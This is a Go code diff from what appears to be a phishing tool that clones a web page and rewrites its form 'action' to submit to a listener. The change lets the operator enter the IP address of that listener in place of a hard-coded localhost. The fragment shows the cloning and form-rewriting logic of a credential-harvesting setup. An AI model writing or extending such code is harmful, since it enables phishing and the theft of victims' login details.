@@ -12,9 +12,9 @@ import (
 )
 
 var (
-	hooktemplate   *template.Template
-	logf           *os.File
-	cloneurl, port string
+	hooktemplate              *template.Template
+	logf                      *os.File
+	cloneurl, port, ipforhook string
 )
 
 func init() {
@@ -56,7 +56,8 @@ func updatehook() {
 
 	output, err := ioutil.ReadAll(fo)
 	checkerr(err)
-	newstring := re.ReplaceAllString(string(output), `action="http://127.0.0.1:80"`)
+	hookurl := "action=" + `"http://` + ipforhook + `:80"`
+	newstring := re.ReplaceAllString(string(output), hookurl)
 	newstring = re2.ReplaceAllString(newstring, "")
 
 	//fmt.Println(newstring)
@@ -129,10 +130,11 @@ func main() {
 	reader := bufio.NewReader(os.Stdin)
 	fmt.Print("Enter URL to clone : ")
 	cloneurl, _ = reader.ReadString('\n')
-	//fmt.Print("Enter port number (Default is 80) : ")
-	//port, _ = reader.ReadString('\n')
+	fmt.Print("Enter IP you want to listen for : ")
+	ipforhook, _ = reader.ReadString('\n')
 	cloneurl = strings.TrimSpace(cloneurl)
-	//port = strings.TrimSpace(port)
+	ipforhook = strings.TrimSpace(ipforhook)
+	//fmt.Println("URL : ", cloneurl)
 
 	clonehook(cloneurl)
 	updatehook()
